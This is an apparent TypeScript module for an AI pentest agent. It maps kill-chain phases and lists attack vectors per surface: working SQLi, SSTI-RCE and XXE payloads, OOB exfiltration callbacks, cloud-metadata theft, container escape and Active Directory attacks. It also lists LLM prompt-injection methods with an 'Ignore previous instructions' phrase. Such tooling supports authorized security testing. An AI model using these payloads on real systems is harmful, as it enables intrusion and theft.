/**
 * Offensive phase detection, transition directives, counter-logic vectors,
 * and the Counter-Logic Gauntlet (permanent adversarial reasoning protocol).
 *
 * Three layers work together:
 *
 * 1. **Phase detection & transitions** — inferred from tool usage, not
 *    self-report.  Mandatory directives push the model through the kill chain.
 *
 * 2. **Surface vectors** — concrete attack test suggestions matched to
 *    surface labels (auth, payment, JS, traffic, etc.).  Pillar 2 of the
 *    Counter-Logic Protocol.
 *
 * 3. **The Gauntlet** — a permanent cognitive protocol (all 4 pillars +
 *    the 4-step ritual + quick reference checklist) injected every turn to
 *    force the model to challenge its own assumptions, invert its reasoning,
 *    adopt adversarial personas, trace blast radius, and prescribe hardening.
 *    This is NOT conditional — it fires on every single turn.
 */

// ---------------------------------------------------------------------------
// Phase definitions
// ---------------------------------------------------------------------------

export const OFFENSIVE_PHASES = [
  "recon",
  "enumerate",
  "exploit",
  "post-exploit",
  "report",
] as const;

export type OffensivePhase = (typeof OFFENSIVE_PHASES)[number];

// Tools the model uses in each phase — used to classify, not to restrict.
const RECON_TOOLS = new Set([
  "nmap", "masscan", "httpx", "dnsx", "subfinder", "amass",
  "whatweb", "wafw00f", "dig", "whois", "shodan", "censys",
  "theHarvester", "assetfinder", "bbot",
]);

const ENUMERATE_TOOLS = new Set([
  "gobuster", "feroxbuster", "dirsearch", "ffuf", "wfuzz",
  "nikto", "arjun", "paramspider", "katana", "hakrawler",
  "source-deep", "linkfinder", "jsluice", "secretfinder",
  "jsa", "retire", "webpack-analyzer",
  "mitmproxy", "burp", "zap", "cariddi",
  "cyber_source", "cyber_entity",
]);

export const EXPLOIT_TOOLS_SET = new Set([
  "sqlmap", "dalfox", "commix", "tplmap", "ssrfmap",
  "nuclei", "xsstrike", "nosqlmap", "ysoserial",
  "hydra", "john", "hashcat", "responder", "impacket",
  "metasploit", "msfvenom", "searchsploit",
]);

const EXPLOIT_TOOLS = EXPLOIT_TOOLS_SET;

const POST_EXPLOIT_TOOLS = new Set([
  "mimikatz", "rubeus", "bloodhound", "sharphound",
  "crackmapexec", "evil-winrm", "psexec", "wmiexec",
  "linpeas", "winpeas", "pspy",
]);

const REPORT_TOOLS = new Set([
  "cyber_report", "cyber_verification", "cyber_capitalise", "cyber_cleanup",
  "rapports-cyber", "capitaliser-cyber",
]);

// ---------------------------------------------------------------------------
// Phase detection — data-driven, not model-declared
// ---------------------------------------------------------------------------

export interface PhaseInput {
  toolsUsed: readonly string[];
  observationCount: number;
  surfacesTotal: number;
  surfacesTested: number;
  surfacesUntested: number;
  surfacesInProgress: number;
  confirmedFindings: number;
  consecutiveExploitFailures: number;
}

export function detectPhase(input: PhaseInput): OffensivePhase {
  const tools = new Set(input.toolsUsed);
  const reconCount = [...tools].filter((t) => RECON_TOOLS.has(t)).length;
  const enumCount = [...tools].filter((t) => ENUMERATE_TOOLS.has(t)).length;
  const exploitCount = [...tools].filter((t) => EXPLOIT_TOOLS.has(t)).length;
  const postCount = [...tools].filter((t) => POST_EXPLOIT_TOOLS.has(t)).length;
  const reportCount = [...tools].filter((t) => REPORT_TOOLS.has(t)).length;

  // 3-failure backtrack: forced return to enumerate
  if (input.consecutiveExploitFailures >= 3) return "enumerate";

  // Report: reporting/verification tools active
  if (reportCount > 0) return "report";

  // Post-exploit: confirmed findings and post-exploit tools active
  if (input.confirmedFindings > 0 && postCount > 0) return "post-exploit";

  // Exploit: exploit tools are the dominant activity
  if (exploitCount > 0 && exploitCount >= reconCount) return "exploit";

  // Enumerate: enumeration tools in use, or surfaces declared and being mapped
  if (enumCount > 0 || (input.surfacesTotal > 0 && input.surfacesInProgress > 0))
    return "enumerate";

  // Report: all declared surfaces tested with no pending/in-progress surfaces
  if (
    input.surfacesTotal > 0 &&
    input.surfacesTested >= input.surfacesTotal &&
    input.surfacesUntested === 0 &&
    input.surfacesInProgress === 0
  )
    return "report";

  // Default: recon
  return "recon";
}

// ---------------------------------------------------------------------------
// Transition readiness — when should the model move to the next phase?
// ---------------------------------------------------------------------------

interface TransitionCheck {
  ready: boolean;
  targetPhase: OffensivePhase;
  reason: string;
}

export function transitionCheck(
  currentPhase: OffensivePhase,
  input: PhaseInput,
): TransitionCheck | null {
  if (currentPhase === "recon") {
    // Recon → enumerate: surfaces declared OR enough passive observations
    if (input.surfacesTotal > 0 || input.observationCount >= 8) {
      return {
        ready: true,
        targetPhase: "enumerate",
        reason: input.surfacesTotal > 0
          ? `${input.surfacesTotal} surface(s) identified. Start active enumeration: map parameters, endpoints, and input vectors on each surface.`
          : `${input.observationCount} observations collected without declaring surfaces. Name the attack surfaces before continuing.`,
      };
    }
  }

  if (currentPhase === "enumerate") {
    // Enumerate → exploit: surfaces declared AND at least some have parameters/endpoints mapped
    if (input.surfacesTotal > 0 && input.observationCount >= 12 && input.surfacesUntested > 0) {
      return {
        ready: true,
        targetPhase: "exploit",
        reason: `Enumeration sufficient: ${input.surfacesTotal} surfaces, ${input.observationCount} observations. ${input.surfacesUntested} surface(s) await offensive testing.`,
      };
    }
  }

  if (currentPhase === "exploit") {
    // Exploit → post-exploit: at least one confirmed finding
    if (input.confirmedFindings > 0 && input.surfacesUntested === 0) {
      return {
        ready: true,
        targetPhase: "post-exploit",
        reason: `${input.confirmedFindings} confirmed finding(s), all surfaces tested. Deepen: escalate confirmed findings, look for chains, test lateral impact.`,
      };
    }
    // Exploit → enumerate (backtrack): 3 consecutive failures
    if (input.consecutiveExploitFailures >= 3) {
      return {
        ready: true,
        targetPhase: "enumerate",
        reason: `3 consecutive exploit failures. Backtrack to enumeration: gather more information before retrying. Different tool, different angle.`,
      };
    }
  }

  if (currentPhase === "post-exploit") {
    if (
      input.surfacesTotal > 0 &&
      input.surfacesTested >= input.surfacesTotal &&
      input.surfacesUntested === 0 &&
      input.surfacesInProgress === 0
    ) {
      return {
        ready: true,
        targetPhase: "report",
        reason: `All ${input.surfacesTotal} surface(s) tested and post-exploitation complete. Transition to reporting: verify every finding with independent controls.`,
      };
    }
  }

  return null;
}

// ---------------------------------------------------------------------------
// Counter-logic vectors — concrete attack suggestions per surface
// ---------------------------------------------------------------------------

/** A counter-logic vector applicable to a surface. */
export interface CounterLogicVector {
  pillar: 1 | 2 | 3 | 4;
  category: string;
  test: string;
}

/**
 * Keywords in a surface label that suggest specific counter-logic vectors.
 *
 * Each pattern maps label content to Pillar 2/3 attack vectors.  The vectors
 * are concrete enough that a model can act on them without loading a skill.
 */
const SURFACE_VECTORS: {
  pattern: RegExp;
  vectors: CounterLogicVector[];
}[] = [
  {
    pattern: /auth|login|session|token|jwt|oauth|sso|saml/i,
    vectors: [
      { pillar: 2, category: "State-Machine Skip", test: "Access protected endpoints without completing the auth flow (forced browsing)" },
      { pillar: 2, category: "IDOR", test: "Replace your user/session ID with another user's in the same request" },
      { pillar: 2, category: "Race Condition", test: "Send parallel login/token-refresh requests — does it issue duplicate sessions?" },
      { pillar: 1, category: "Inversion", test: "What happens with an expired token? A malformed token? An empty Authorization header?" },
    ],
  },
  {
    pattern: /pay|checkout|cart|order|price|amount|balance|money.?transfer|bank.?transfer|wallet|credit|debit|invoice/i,
    vectors: [
      { pillar: 2, category: "Parameter Tampering", test: "Set quantity to -1 or 0, price to 0.001, amount to negative — does the server validate?" },
      { pillar: 2, category: "Race Condition (TOCTOU)", test: "Send 10 concurrent transfer/payment requests — does it debit once or ten times?" },
      { pillar: 2, category: "State-Machine Skip", test: "Call confirm/complete without passing through validate/payment step" },
      { pillar: 2, category: "Callback Forgery", test: "Forge the payment webhook — does the server verify the signature or trust the client?" },
      { pillar: 4, category: "Precision Truncation", test: "Transfer 0.001 units repeatedly — do rounding errors accumulate?" },
    ],
  },
  {
    pattern: /api|endpoint|rest|graphql|grpc/i,
    vectors: [
      { pillar: 2, category: "IDOR Nested", test: "GET /tenant/A/resource/999 — does it verify resource 999 belongs to tenant A?" },
      { pillar: 2, category: "Method Tampering", test: "Replace GET with PUT/DELETE/PATCH — does the server enforce method restrictions?" },
      { pillar: 1, category: "Inversion", test: "What is assumed never null in the response? Send requests that break that assumption." },
      { pillar: 2, category: "Mass Assignment", test: "Add extra fields (role, isAdmin, status) to POST/PATCH — does the server accept them?" },
    ],
  },
  {
    pattern: /upload|file|image|document|attachment|media/i,
    vectors: [
      { pillar: 2, category: "File Upload Bypass", test: "Upload .php/.jsp/.aspx with double extension, null byte, or MIME mismatch" },
      { pillar: 1, category: "Inversion", test: "Upload a 0-byte file, a 100MB file, a file with path traversal in the name (../../etc/passwd)" },
      { pillar: 2, category: "Race Condition", test: "Upload + access the file before server-side validation/virus scan completes" },
    ],
  },
  {
    pattern: /search|query|filter|sort|param/i,
    vectors: [
      { pillar: 2, category: "Injection", test: "SQL injection in search/filter params: ' OR 1=1--, UNION SELECT, blind time-based" },
      { pillar: 2, category: "SSTI", test: "Template injection in search output: {{7*7}}, ${7*7}, #{7*7}" },
      { pillar: 1, category: "Inversion", test: "Empty search, search with 10000 chars, search with null bytes — observe error handling" },
    ],
  },
  {
    pattern: /admin|dashboard|panel|manage|config|setting/i,
    vectors: [
      { pillar: 2, category: "Privilege Escalation", test: "Access admin endpoints with a regular user token — is authorization enforced per-endpoint?" },
      { pillar: 2, category: "State-Machine Skip", test: "Call admin actions (delete user, change config) without the approval/confirmation step" },
      { pillar: 1, category: "Inversion", test: "What happens if the admin role is removed mid-session? Does the session retain privileges?" },
    ],
  },
  {
    pattern: /register|signup|account|profile|user/i,
    vectors: [
      { pillar: 2, category: "Race Condition", test: "Create the same account concurrently — does uniqueness hold under parallel requests?" },
      { pillar: 2, category: "Mass Assignment", test: "Add role=admin or verified=true to the registration payload" },
      { pillar: 2, category: "IDOR", test: "View/edit another user's profile by changing the user ID in the URL/body" },
    ],
  },
  {
    pattern: /coupon|discount|promo|voucher|referral|reward/i,
    vectors: [
      { pillar: 2, category: "Race Condition", test: "Apply the same one-time coupon concurrently — does it apply twice?" },
      { pillar: 2, category: "Parameter Tampering", test: "Negative discount amount, coupon on zero-value cart, stacking incompatible coupons" },
      { pillar: 4, category: "Cobra Effect", test: "Create referral loop (A refers B, B refers A) — does it grant infinite rewards?" },
    ],
  },
  {
    pattern: /mobile|app|flutter|android|ios|apk/i,
    vectors: [
      { pillar: 3, category: "Clock Manipulation", test: "Does trial/token expiry rely on device time? Change device clock forward/backward." },
      { pillar: 3, category: "Multi-Tap", test: "Tap submit 5x in 100ms — does it spawn 5 backend transactions?" },
      { pillar: 3, category: "Network Flap", test: "Drop network mid-transaction — is the state consistent when reconnected?" },
    ],
  },
  {
    pattern: /websocket|ws|socket|realtime|chat|notification/i,
    vectors: [
      { pillar: 2, category: "CSWSH", test: "Connect from a cross-origin page — is the Origin header validated?" },
      { pillar: 2, category: "Injection", test: "Send malformed JSON/frames — does the server crash or leak errors?" },
      { pillar: 2, category: "Race Condition", test: "Send messages faster than the server processes — does ordering break state?" },
    ],
  },
  {
    pattern: /js|javascript|bundle|chunk|source|spa|react|angular|vue|next|nuxt|webpack|vite|frontend|client.?side/i,
    vectors: [
      { pillar: 2, category: "JS Endpoint Extraction", test: "Download JS bundles/chunks, grep for /api/, /v1/, /graphql, fetch(, axios — map the hidden API surface the UI never exposes" },
      { pillar: 2, category: "Hardcoded Secrets", test: "Search bundles for API keys, tokens, AWS/GCP/Azure credentials, Firebase config, Stripe keys, internal hostnames" },
      { pillar: 2, category: "Source Map Leak", test: "Check for .map files (bundle.js.map) — if present, reconstruct full original source and audit business logic" },
      { pillar: 1, category: "Client-Side Auth", test: "Is authorization enforced only in JS (route guards, role checks in React/Vue)? Bypass by calling the API directly." },
      { pillar: 2, category: "Dead/Debug Code", test: "Search for console.log, debugger, TODO, HACK, staging/dev URLs, feature flags with hardcoded toggles" },
      { pillar: 4, category: "Client Trust", test: "Does the client compute prices, discounts, or permissions locally? Replay the request with tampered values — the server must re-validate." },
    ],
  },
  {
    pattern: /traffic|intercept|proxy|burp|http.?request|http.?response|header.?inject|cookie|cors|csp|hsts|network.?traffic|redirect/i,
    vectors: [
      { pillar: 2, category: "Hidden Endpoints", test: "Capture all traffic during normal usage — find endpoints not in docs: internal APIs, debug routes, health checks, metrics" },
      { pillar: 2, category: "Header Injection", test: "Inject X-Forwarded-For, X-Original-URL, X-Rewrite-URL to bypass IP/path restrictions" },
      { pillar: 2, category: "Cookie Manipulation", test: "Decode session cookies (JWT, base64, serialized objects) — tamper with role/user fields, test without HttpOnly/Secure flags" },
      { pillar: 1, category: "CORS Misconfiguration", test: "Send Origin: https://evil.com — does the server reflect it in Access-Control-Allow-Origin? Test with null origin." },
      { pillar: 2, category: "Redirect Chain Abuse", test: "Follow all 3xx redirects manually — can open redirects chain to steal tokens via Referer or fragment?" },
      { pillar: 4, category: "CSP Bypass", test: "If CSP allows unsafe-inline, script-src with a CDN, or missing frame-ancestors — test XSS/clickjacking through the gap" },
    ],
  },
  // --- XSS ---
  {
    pattern: /xss|cross.?site.?script|reflected|stored|dom.?xss|blind.?xss/i,
    vectors: [
      { pillar: 2, category: "WAF Bypass", test: "Split payload across duplicate parameters, use double-encoding (%253C), fullwidth Unicode, or multipart boundary confusion to bypass WAF" },
      { pillar: 2, category: "Context-Specific Payload", test: "Identify injection context (HTML body, attribute, JS string, template literal, AngularJS) and use the matching escape/payload" },
      { pillar: 2, category: "DOM XSS", test: "Trace location.hash, postMessage, document.referrer to innerHTML/document.write sinks — inject via fragment/message" },
      { pillar: 2, category: "Blind XSS", test: "Inject OOB probe in User-Agent, Referer, contact forms, support tickets, file metadata — wait for admin-context callback" },
      { pillar: 2, category: "SVG/File XSS", test: "Upload SVG with onload=fetch(CALLBACK), or inject XXE payload in SVG to chain XSS+XXE" },
      { pillar: 1, category: "Inversion", test: "If WAF blocks <script>, test <details/open/ontoggle>, <input autofocus onfocus>, <video onloadstart> — alternative tags/events" },
    ],
  },
  // --- SQL Injection ---
  {
    pattern: /sqli|sql.?inject|database|mysql|postgres|mssql|oracle|mariadb|sqlite/i,
    vectors: [
      { pillar: 2, category: "Second-Order SQLi", test: "Register with username admin'-- then trigger password reset or profile export — does the stored input hit an unsafe query later?" },
      { pillar: 2, category: "Stacked Queries RCE", test: "MSSQL: xp_cmdshell + nslookup CALLBACK. PostgreSQL: COPY TO PROGRAM. MySQL: LOAD_FILE/INTO OUTFILE" },
      { pillar: 2, category: "OOB Exfiltration", test: "MSSQL: xp_dirtree to UNC. Oracle: UTL_HTTP.REQUEST. MySQL: LOAD_FILE to DNS — exfiltrate when no visible output" },
      { pillar: 2, category: "NoSQL Injection", test: "MongoDB: replace password with {$gt:''}, inject {$where:'sleep(5000)'}, use [$ne] in query string bracket notation" },
      { pillar: 2, category: "ORM Injection", test: "Sequelize: {$like:'%admin%'} in JSON body. Hibernate: HQL injection via CAST. Prisma: $queryRaw with unsanitized orderBy" },
      { pillar: 1, category: "Inversion", test: "If basic SQLi fails — try different quote types, comment styles (--,--%20,#,;%00), or time-based blind with SLEEP/BENCHMARK" },
    ],
  },
  // --- SSRF ---
  {
    pattern: /ssrf|server.?side.?request|url.?fetch|webhook|pdf.?gen|image.?proxy/i,
    vectors: [
      { pillar: 2, category: "Cloud Metadata", test: "Inject http://169.254.169.254/latest/meta-data/iam/security-credentials/ (AWS), metadata.google.internal (GCP), 169.254.169.254/metadata/identity (Azure)" },
      { pillar: 2, category: "DNS Rebinding", test: "Use a rebinding domain (rbndr.us) that alternates between your IP and 127.0.0.1 with TTL 0 to bypass allowlist-then-fetch" },
      { pillar: 2, category: "Protocol Smuggling", test: "Try gopher:// to send raw TCP to internal Redis/memcached, dict:// for service probing, file:// for local file read" },
      { pillar: 1, category: "Inversion", test: "If direct IPs are blocked — try decimal IP (2130706433), IPv6 (::1), DNS that resolves to 127.0.0.1, URL with @redirect" },
    ],
  },
  // --- SSTI ---
  {
    pattern: /ssti|template.?inject|jinja|twig|freemarker|velocity|pebble|thymeleaf/i,
    vectors: [
      { pillar: 2, category: "Detection Polyglot", test: "Inject <%'${{/#{@}}%>{{ in every reflected input — a 500 or template stack trace confirms template evaluation" },
      { pillar: 2, category: "Engine Identification", test: "{{7*7}} vs ${7*7}: result 49 for {{}} → Jinja2 if {{7*'7'}}=7777777, Twig if 49. ${} → Freemarker if ${'ab'?upper_case}=AB" },
      { pillar: 2, category: "Jinja2 RCE", test: "{{ lipsum.__globals__['os'].popen('id').read() }} or {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}" },
      { pillar: 2, category: "Twig/Freemarker/Velocity RCE", test: "Twig: {{['id']|filter('system')}}. Freemarker: ${'freemarker.template.utility.Execute'?new()('id')}. Velocity: #set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))" },
    ],
  },
  // --- XXE ---
  {
    pattern: /xxe|xml.?external|xml.?inject|xml.?parse|docx.?upload|svg.?upload|xlsx.?parse/i,
    vectors: [
      { pillar: 2, category: "Classic XXE", test: "POST with Content-Type: application/xml, <!ENTITY xxe SYSTEM 'file:///etc/passwd'> — if file contents appear, external entities resolve" },
      { pillar: 2, category: "Blind OOB XXE", test: "Parameter entity loading external DTD that exfiltrates file contents via HTTP callback to your server" },
      { pillar: 2, category: "Office Document XXE", test: "Modify [Content_Types].xml or xl/sharedStrings.xml inside .docx/.xlsx with XXE entity — if callback fires, document parser is vulnerable" },
      { pillar: 2, category: "SVG XXE", test: "Upload SVG with <!ENTITY xxe SYSTEM 'file:///etc/passwd'><text>&xxe;</text> — if file contents render, image processor has XXE" },
    ],
  },
  // --- Deserialization ---
  {
    pattern: /deseriali|serial|pickle|marshal|ysoserial|phar|viewstate|objectinput/i,
    vectors: [
      { pillar: 2, category: "Java Deser", test: "ysoserial CommonsCollections/Spring gadget as Base64 cookie or POST param — DNS callback confirms RCE via deserialization" },
      { pillar: 2, category: "PHP Phar", test: "Submit phar:///tmp/uploaded.jpg as file path — if destruct/wakeup fires, phar deserialization triggers magic methods" },
      { pillar: 2, category: "Python Pickle", test: "Inject cos\\nsystem\\n payload as Base64 session cookie — if callback fires, pickle.loads() on untrusted input" },
      { pillar: 2, category: ".NET TypeNameHandling", test: "JSON body with $type pointing to ObjectDataProvider/Process — if DNS callback fires, Newtonsoft.Json instantiates arbitrary types" },
    ],
  },
  // --- Prototype Pollution ---
  {
    pattern: /prototype.?pollut|__proto__|constructor.?prototype|merge|lodash.?merge|deep.?extend/i,
    vectors: [
      { pillar: 2, category: "JSON Body Pollution", test: "Send {\"__proto__\":{\"isAdmin\":true}} to merge/update endpoint — if subsequent request grants admin, prototype was polluted" },
      { pillar: 2, category: "Query Param Pollution", test: "?constructor[prototype][isAdmin]=true — if behavior changes, query parser populates prototype chain" },
      { pillar: 2, category: "PP2RCE Gadget", test: "Pollute shell/NODE_OPTIONS on a merge endpoint that later calls child_process — DNS callback confirms RCE via pollution" },
    ],
  },
  // --- Cache Poisoning & Request Smuggling ---
  {
    pattern: /cache.?poison|smuggl|desync|cl.te|te.cl|h2\.cl|pipeline|unkeyed/i,
    vectors: [
      { pillar: 2, category: "Unkeyed Header", test: "Add X-Forwarded-Host: attacker.com to a cacheable page — if reflected in cache, visitors get poisoned response" },
      { pillar: 2, category: "CL.TE Desync", test: "POST with CL:6 + TE:chunked, body 0\\r\\n\\r\\nG — if next request gets 405 GPOST, frontend/backend disagree on body boundary" },
      { pillar: 2, category: "H2 Smuggling", test: "HTTP/2 POST with explicit content-length:0 but non-empty body containing a smuggled GET — if admin page returns, H2→H1 downgrade desync" },
      { pillar: 2, category: "Response Queue Poison", test: "Pipeline two requests where the first smuggles a prefix — if you receive another user's response, queue is desynchronized" },
      { pillar: 1, category: "Cache Key Normalization", test: "Request /path vs /Path vs /path/ vs /path;x — if two variants share a cache entry, poison one to serve via the other" },
    ],
  },
  // --- Credential Attacks ---
  {
    pattern: /credential|password|brute.?force|spray|stuff|lockout|mfa|2fa|otp|backup.?code/i,
    vectors: [
      { pillar: 2, category: "Password Spray", test: "1 attempt per account across N accounts, stay at threshold-1 — probe lockout threshold on sacrificial account first" },
      { pillar: 2, category: "Rate Limit Bypass", test: "Rotate X-Forwarded-For, X-Real-IP per request. Try null byte or case-change on username. Use alternate API version/format" },
      { pillar: 2, category: "Username Enumeration", test: "Compare response time, body size, error text between valid and invalid usernames — any consistent delta leaks existence" },
      { pillar: 2, category: "Default Credentials", test: "Tomcat:tomcat/tomcat, Jenkins:admin/admin, Grafana:admin/admin, phpMyAdmin:root/empty, Spring Actuator:no-auth" },
      { pillar: 2, category: "MFA Bypass", test: "Manipulate 2FA response (false→true), reuse OTP code, skip /verify-2fa and go directly to /dashboard, brute-force 4-6 digit code" },
    ],
  },
  // --- Cloud Security ---
  {
    pattern: /cloud|aws|azure|gcp|s3|bucket|iam|lambda|ec2|metadata|imds|serverless/i,
    vectors: [
      { pillar: 2, category: "IMDS v1 SSRF", test: "curl 169.254.169.254/latest/meta-data/iam/security-credentials/ from any SSRF vector — if credentials return, IMDSv2 not enforced" },
      { pillar: 2, category: "S3 Bucket Misconfiguration", test: "aws s3 ls s3://{company}-{backup,dev,assets,logs} --no-sign-request — if listing or read succeeds, bucket is public" },
      { pillar: 2, category: "IAM Privilege Escalation", test: "Check for iam:PassRole + lambda:CreateFunction or ec2:RunInstances — create resource that assumes higher-privilege role" },
      { pillar: 2, category: "Lambda Env Leakage", test: "aws lambda get-function — if Environment.Variables contains DB creds/API keys in plaintext, secrets leak to any GetFunction principal" },
      { pillar: 2, category: "Cross-Account Trust", test: "Inspect AssumeRolePolicyDocument for Principal:* or missing sts:ExternalId condition — assume-role from your account" },
      { pillar: 2, category: "Azure IMDS Token", test: "curl -H 'Metadata:true' 169.254.169.254/metadata/identity/oauth2/token — if access_token returns, managed identity is reachable" },
    ],
  },
  // --- Container Security ---
  {
    pattern: /container|docker|kubernetes|k8s|pod|kubelet|etcd|helm|registry|cgroup/i,
    vectors: [
      { pillar: 2, category: "Docker Socket Escape", test: "ls -la /var/run/docker.sock — if writable, spawn privileged container mounting host root and read /etc/shadow" },
      { pillar: 2, category: "K8s Service Account Abuse", test: "cat /var/run/secrets/kubernetes.io/serviceaccount/token + query kubernetes.default.svc — if secrets list, RBAC misconfigured" },
      { pillar: 2, category: "Exposed Kubelet", test: "curl -sk https://{node}:10250/pods — if pod listing returns without auth, kubelet is unauthenticated → RCE on pods via /run" },
      { pillar: 2, category: "Privileged Container Escape", test: "Check CapEff in /proc/1/status — if all caps, cgroup release_agent escape to host" },
      { pillar: 2, category: "Exposed etcd", test: "curl http://{ip}:2379/v2/keys/?recursive=true or etcdctl get / --prefix — if secrets return, entire cluster credentials exposed" },
      { pillar: 2, category: "Registry Without Auth", test: "curl https://{registry}/v2/_catalog — if repos list without credentials, check image configs for ENV secrets" },
    ],
  },
  // --- Active Directory ---
  {
    pattern: /active.?directory|\bAD\b|kerberos|ldap|ntlm|domain.?controller|\bDC\b|bloodhound|spn|gpo/i,
    vectors: [
      { pillar: 2, category: "Kerberoasting", test: "GetUserSPNs -request → TGS tickets → hashcat -m 13100 — if service account password cracks, check DA membership" },
      { pillar: 2, category: "AS-REP Roasting", test: "GetNPUsers with user list — accounts with DONT_REQUIRE_PREAUTH return crackable hashes without authentication" },
      { pillar: 2, category: "ACL Abuse", test: "BloodHound shortest path to DA — GenericAll: reset password, WriteDACL: grant yourself GenericAll, WriteOwner: take ownership" },
      { pillar: 2, category: "NTLM Relay", test: "crackmapexec --gen-relay-list for hosts without SMB signing + PetitPotam/PrinterBug coercion → ntlmrelayx to LDAP/SMB" },
      { pillar: 2, category: "ADCS ESC1-ESC8", test: "certipy find -vulnerable — if template has enrollee-supplies-SAN + low-priv enrollment + auth EKU → impersonate DA" },
      { pillar: 2, category: "DCSync", test: "With Replicating Directory Changes rights → secretsdump -just-dc → if krbtgt hash dumps, full domain compromise" },
    ],
  },
  // --- Network Pivoting ---
  {
    pattern: /pivot|lateral|movement|tunnel|forward|relay|chisel|ligolo|socks|proxy.?chain/i,
    vectors: [
      { pillar: 2, category: "SSH Dynamic Forwarding", test: "ssh -D 1080 pivot_host → proxychains nmap internal subnet — if internal hosts respond, segmentation bypassed" },
      { pillar: 2, category: "Pass-the-Hash", test: "psexec/crackmapexec -H {NT_HASH} → if SYSTEM shell without plaintext password, PtH confirmed across all hosts with that local admin" },
      { pillar: 2, category: "Pass-the-Ticket", test: "Export TGT with getTGT/mimikatz → KRB5CCNAME=ticket.ccache psexec -k -no-pass — Kerberos-only lateral, bypasses NTLM detection" },
      { pillar: 2, category: "Chisel Reverse Tunnel", test: "chisel server --reverse on attack box + chisel client R:socks on target — if internal services respond through SOCKS, firewall egress filtering bypassed" },
      { pillar: 2, category: "LOLBin Lateral", test: "wmic /node:{target} process call create or schtasks /create /s {target} — no third-party binary needed" },
    ],
  },
  // --- DNS & Subdomain ---
  {
    pattern: /dns|subdomain|zone.?transfer|axfr|takeover|cname|nameserver|resolv/i,
    vectors: [
      { pillar: 2, category: "Zone Transfer", test: "dig axfr {domain} @{ns} for every authoritative NS — if full zone returns, entire DNS inventory exposed" },
      { pillar: 2, category: "Subdomain Takeover", test: "subfinder | dnsx -cname — if CNAME points to deprovisioned S3/Azure/Heroku/GitHub and service returns NoSuchBucket/404, claim it" },
      { pillar: 2, category: "DNS Rebinding", test: "Rebinding domain alternating your IP/127.0.0.1 with TTL 0 submitted to URL fetch — if internal content returns, SSRF bypass confirmed" },
      { pillar: 1, category: "Wildcard Detection", test: "dig doesnotexist12345.{domain} — if resolves, switch to filtered brute-force comparing against wildcard IP" },
    ],
  },
  // --- Secret Scanning ---
  {
    pattern: /secret|leak|credential.?scan|gitleaks|trufflehog|git.?history|\.env|config.?file/i,
    vectors: [
      { pillar: 2, category: "Git History Secrets", test: "gitleaks detect or trufflehog git — scan entire commit history for API keys, tokens, passwords committed then 'removed'" },
      { pillar: 2, category: "Env File Exposure", test: "Request /.env, /config/.env, /.env.production, /wp-config.php.bak, /application.yml — if readable, secrets exposed" },
      { pillar: 2, category: "Cloud Metadata Secrets", test: "Check /proc/1/environ, /proc/self/environ for leaked env vars containing tokens, keys, database URIs" },
      { pillar: 1, category: "Inversion", test: "Even if .env returns 403 — try .env.bak, .env.old, .env.swp, .env~ — backup files often bypass access rules" },
    ],
  },
  // --- Supply Chain ---
  {
    pattern: /supply.?chain|dependency|lockfile|sbom|npm.?audit|pip.?audit|typosquat|confusion/i,
    vectors: [
      { pillar: 2, category: "Dependency Confusion", test: "Check if internal package names exist on public npm/PyPI — if not, register and check if the target installs your version" },
      { pillar: 2, category: "Known CVE in Deps", test: "npm audit / pip-audit / trivy fs — flag any dependency with a known exploitable CVE, then check if the vulnerable code path is reachable" },
      { pillar: 2, category: "Lockfile Integrity", test: "Compare lockfile hashes against registry — a tampered lockfile installs a different package than expected" },
      { pillar: 1, category: "Inversion", test: "Even with 0 audit findings — are devDependencies installed in production? Is postinstall running arbitrary scripts?" },
    ],
  },
  // --- IoT / Embedded ---
  {
    pattern: /iot|firmware|embedded|uart|jtag|serial|default.?cred|smart.?device|zigbee|mqtt/i,
    vectors: [
      { pillar: 2, category: "Default Credentials", test: "admin:admin, root:root, admin:1234, vendor-specific from cirt.net/passwords — many IoT devices ship with unchanged defaults" },
      { pillar: 2, category: "Firmware Extraction", test: "binwalk -e firmware.bin — extract filesystem, search for hardcoded credentials, private keys, debug interfaces" },
      { pillar: 2, category: "UART/JTAG Debug", test: "Physical access: identify UART pins with multimeter, connect at common baud rates (115200) — if shell drops, full device access" },
      { pillar: 2, category: "MQTT No Auth", test: "mosquitto_sub -h {target} -t '#' — if messages stream without credentials, MQTT broker is unauthenticated" },
    ],
  },
  // --- LLM / AI Security ---
  {
    pattern: /llm|ai.?security|prompt.?inject|jailbreak|agent|chatbot|rag|embedding/i,
    vectors: [
      { pillar: 2, category: "Prompt Injection", test: "Inject 'Ignore previous instructions and...' in every user-controlled input that reaches the LLM — does it override the system prompt?" },
      { pillar: 2, category: "Indirect Injection", test: "Place instructions in documents the RAG pipeline retrieves — if the LLM follows them, indirect injection confirmed" },
      { pillar: 2, category: "Data Exfiltration", test: "Ask the LLM to include system prompt, training data, or other users' conversations in its output — test both direct and encoded extraction" },
      { pillar: 2, category: "Tool Abuse", test: "If the LLM has tool access — can a crafted prompt make it call tools with attacker-controlled arguments? (SSRF via URL tool, file read via code tool)" },
    ],
  },
  // --- Social Engineering ---
  {
    pattern: /social.?eng|phish|pretext|vishing|smishing|spear|whaling|impersonat/i,
    vectors: [
      { pillar: 2, category: "Phishing Simulation", test: "Send crafted email with canary link to approved recipient list — track open rate, click rate, credential submission rate" },
      { pillar: 2, category: "Pretexting", test: "Call the target posing as IT support/vendor — does the person give credentials, MFA codes, or VPN access without verification?" },
      { pillar: 2, category: "Spear Phishing", test: "Personalized email using OSINT (LinkedIn, company blog) with urgent pretext — higher click rate than generic phishing" },
      { pillar: 1, category: "Inversion", test: "What would make YOUR phishing fail? Multi-factor auth, URL scanning, security awareness training — test if these controls actually stop it" },
    ],
  },
  // --- Red Team ---
  {
    pattern: /red.?team|kill.?chain|foothold|persist|c2|command.?control|beacon|exfil|evasion/i,
    vectors: [
      { pillar: 2, category: "Initial Access", test: "Phishing, exposed service exploit, default creds, password spray — which path gives the first foothold fastest?" },
      { pillar: 2, category: "Persistence", test: "Cron/systemd/scheduled task, registry run key, DLL hijack, startup folder — does it survive reboot? Does blue team detect it?" },
      { pillar: 2, category: "C2 Channel", test: "HTTP/HTTPS beaconing, DNS tunneling, WebSocket, cloud storage (S3/Blob) — which channel survives egress filtering?" },
      { pillar: 2, category: "Exfiltration", test: "Data out via DNS, HTTPS, ICMP, steganography — test DLP controls, check if volume/frequency triggers alerts" },
      { pillar: 4, category: "Detection Twin", test: "For every offensive action, write the detection rule that should catch it — if blue team's SIEM doesn't fire, the control is missing" },
    ],
  },
